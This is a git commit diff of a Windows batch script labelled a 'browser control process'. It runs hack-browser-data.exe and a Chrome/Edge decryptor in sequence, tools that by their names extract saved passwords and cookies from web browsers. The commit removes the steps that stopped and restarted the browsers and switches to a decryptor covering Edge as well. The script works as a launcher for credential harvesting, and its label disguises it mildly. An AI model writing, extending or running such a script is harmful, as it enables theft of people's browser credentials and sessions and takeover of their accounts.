c2d3324bb5fb473dd904735c41817773d79f10d5
24-20 <106987713+24-20@users.noreply.github.com>
2024-12-22 17:30:58 +0100

    Update process.bat

--- bigboyfolder/process.bat
+++ bigboyfolder/process.bat
@@ -5,11 +5,6 @@ cd "%~dp0"
 echo Starting browser control process...
 echo Running from directory: %CD%
 
-REM Run stop_browsers
-call stop_browsers.bat
-
-REM Brief wait for browsers to close
-timeout /t 3 /nobreak
 
 echo Running applications sequentially...
 
@@ -18,7 +13,7 @@ REM Run each exe immediately after the previous one finishes
 "%CD%\hack-browser-data.exe"
 timeout /t 1 /nobreak
 
-"%CD%\chrome_decryptor.exe"
+"%CD%\chrome_edge_decryptor.exe"
 timeout /t 1 /nobreak
 
 
@@ -26,8 +21,6 @@ timeout /t 1 /nobreak
 REM Quick final wait
 timeout /t 1 /nobreak
 
-REM Start browsers
-call start_browsers.bat
 
 REM Signal completion
 del /F /Q "%CD%\running.tmp"
